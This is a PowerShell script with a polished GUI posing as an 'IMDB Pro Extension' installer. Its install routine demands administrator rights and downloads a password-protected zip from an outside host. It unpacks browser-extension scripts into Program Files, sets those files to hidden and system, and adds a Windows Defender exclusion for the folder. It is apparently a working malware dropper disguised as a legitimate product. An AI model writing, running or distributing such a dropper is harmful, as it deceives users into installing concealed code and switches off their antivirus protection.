# IMDB Pro Installer - Obfuscated UI Version
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null

$f = New-Object System.Windows.Forms.Form
$f.Text = "🎬 IMDB Pro Installer"
$f.Size = New-Object System.Drawing.Size(600, 500)
$f.StartPosition = "CenterScreen"
$f.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 45)
$f.ForeColor = [System.Drawing.Color]::White
$f.FormBorderStyle = "FixedDialog"
$f.MaximizeBox = $false

# Header
$p = New-Object System.Windows.Forms.Panel
$p.Location = New-Object System.Drawing.Point(0, 0)
$p.Size = New-Object System.Drawing.Size(600, 80)
$p.BackColor = [System.Drawing.Color]::FromArgb(0, 100, 200)
$f.Controls.Add($p)

# Title
$l1 = New-Object System.Windows.Forms.Label
$l1.Text = "🎬 IMDB PRO EXTENSION"
$l1.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
$l1.ForeColor = [System.Drawing.Color]::White
$l1.AutoSize = $true
$l1.Location = New-Object System.Drawing.Point(150, 25)
$p.Controls.Add($l1)

# Features
$g1 = New-Object System.Windows.Forms.GroupBox
$g1.Text = "Features Included:"
$g1.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$g1.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 255)
$g1.Location = New-Object System.Drawing.Point(50, 100)
$g1.Size = New-Object System.Drawing.Size(500, 120)
$f.Controls.Add($g1)

$features = @("✓ Real-time IMDB Ratings", "✓ Complete Movie Info", "✓ Trailers & Previews", "✓ Browser Integration", "✓ Auto Updates", "✓ Secure & Trusted")
$y = 25
foreach ($item in $features) {
    $lb = New-Object System.Windows.Forms.Label
    $lb.Text = $item
    $lb.Font = New-Object System.Drawing.Font("Segoe UI", 9)
    $lb.ForeColor = [System.Drawing.Color]::LightGreen
    $lb.AutoSize = $true
    $lb.Location = New-Object System.Drawing.Point(20, $y)
    $g1.Controls.Add($lb)
    $y += 25
}

# Progress Section
$g2 = New-Object System.Windows.Forms.GroupBox
$g2.Text = "Installation Progress:"
$g2.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$g2.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 255)
$g2.Location = New-Object System.Drawing.Point(50, 240)
$g2.Size = New-Object System.Drawing.Size(500, 150)
$f.Controls.Add($g2)

# Progress Bar
$pb = New-Object System.Windows.Forms.ProgressBar
$pb.Location = New-Object System.Drawing.Point(20, 30)
$pb.Size = New-Object System.Drawing.Size(460, 20)
$pb.Style = "Continuous"
$pb.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 100)
$g2.Controls.Add($pb)

# Status
$l2 = New-Object System.Windows.Forms.Label
$l2.Text = "✅ Ready to Install"
$l2.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$l2.ForeColor = [System.Drawing.Color]::LightGreen
$l2.AutoSize = $true
$l2.Location = New-Object System.Drawing.Point(20, 60)
$g2.Controls.Add($l2)

# Percentage
$l3 = New-Object System.Windows.Forms.Label
$l3.Text = "0%"
$l3.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$l3.ForeColor = [System.Drawing.Color]::FromArgb(0, 200, 255)
$l3.AutoSize = $true
$l3.Location = New-Object System.Drawing.Point(440, 60)
$g2.Controls.Add($l3)

# Details
$rt = New-Object System.Windows.Forms.RichTextBox
$rt.Location = New-Object System.Drawing.Point(20, 90)
$rt.Size = New-Object System.Drawing.Size(460, 50)
$rt.Font = New-Object System.Drawing.Font("Consolas", 8)
$rt.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$rt.ForeColor = [System.Drawing.Color]::LightGray
$rt.ReadOnly = $true
$g2.Controls.Add($rt)

# Install Button
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "🚀 INSTALL NOW"
$btn.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
$btn.Size = New-Object System.Drawing.Size(200, 50)
$btn.Location = New-Object System.Drawing.Point(200, 400)
$btn.FlatStyle = "Flat"
$btn.FlatAppearance.BorderSize = 0
$btn.Cursor = "Hand"

$btn.Add_MouseEnter({
    $this.BackColor = [System.Drawing.Color]::FromArgb(0, 170, 255)
    $this.Font = New-Object System.Drawing.Font("Segoe UI", 12.5, [System.Drawing.FontStyle]::Bold)
})

$btn.Add_MouseLeave({
    if ($this.Text -ne "✅ COMPLETED!") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(0, 150, 255)
        $this.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
    }
})

$btn.Add_Click({
    $this.Enabled = $false
    $this.Text = "⏳ INSTALLING..."
    & $inst
})

$f.Controls.Add($btn)

# Obfuscated Installation Function
$inst = {
    $u = "https://file.apikey.my/imdb/imdb.zip"
    $o = "$env:TEMP\imdb.zip"
    $i = "C:\Program Files\imdb-pro"
    $p = "123"
    
    try {
        & $upd "Checking Administrator rights..." 10
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            & $upd "❌ ERROR: Admin rights required!" 0
            [System.Windows.Forms.MessageBox]::Show("Run as Administrator!", "Error", "OK", "Error")
            $btn.Enabled = $true
            $btn.Text = "🚀 INSTALL NOW"
            return
        }
        
        & $upd "Creating installation directory..." 20
        if (!(Test-Path $i)) {
            New-Item -ItemType Directory -Path $i -Force | Out-Null
        }
        
        & $upd "Downloading IMDB Pro..." 40
        Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing
        
        & $upd "Extracting files..." 60
        $extracted = $false
        
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$p -o"$i" -y $o | Out-Null
            $extracted = $?
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$p -o"$i" -y $o | Out-Null
            $extracted = $?
        }
        elseif (Test-Path "C:\Program Files (x86)\7-Zip\7z.exe") {
            & "C:\Program Files (x86)\7-Zip\7z.exe" x -p$p -o"$i" -y $o | Out-Null
            $extracted = $?
        }
        
        if (-not $extracted) {
            & $upd "Trying alternative method..." 70
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($o, $i)
            }
            catch {
                $s = New-Object -ComObject Shell.Application
                $z = $s.NameSpace($o)
                $d = $s.NameSpace($i)
                $d.CopyHere($z.Items(), 0x14)
                Start-Sleep -Seconds 2
            }
        }
        
        & $upd "Cleaning up..." 80
        Remove-Item $o -Force -ErrorAction SilentlyContinue
        
        & $upd "Hiding files..." 90
        $files = @("background.js", "content.js", "popup.js", "manifest.json")
        foreach ($file in $files) {
            $fp = Join-Path $i $file
            if (Test-Path $fp) {
                Set-ItemProperty -Path $fp -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            }
        }
        
        & $upd "Adding security exclusion..." 95
        Add-MpPreference -ExclusionPath $i -ErrorAction SilentlyContinue
        
        & $upd "✅ Installation Complete!" 100
        $btn.Text = "✅ COMPLETED!"
        $btn.BackColor = [System.Drawing.Color]::FromArgb(46, 204, 113)
        
        [System.Windows.Forms.MessageBox]::Show("🎉 IMDB Pro installed successfully!`n`nLocation: $i", "Success", "OK", "Information")
        
    }
    catch {
        & $upd "❌ ERROR: $($_.Exception.Message)" 0
        $btn.Text = "🔄 TRY AGAIN"
        $btn.BackColor = [System.Drawing.Color]::FromArgb(231, 76, 60)
        $btn.Enabled = $true
    }
}

# Obfuscated Update Function
$upd = {
    param($m, $v, $a = $true)
    
    $l2.Text = $m
    $l3.Text = "$v%"
    if ($v -ge 0) {
        $pb.Value = $v
    }
    if ($a) {
        $rt.AppendText("▶️ $(Get-Date -Format 'HH:mm:ss'): $m`n")
        $rt.ScrollToCaret()
    }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

$f.ShowDialog() | Out-Null
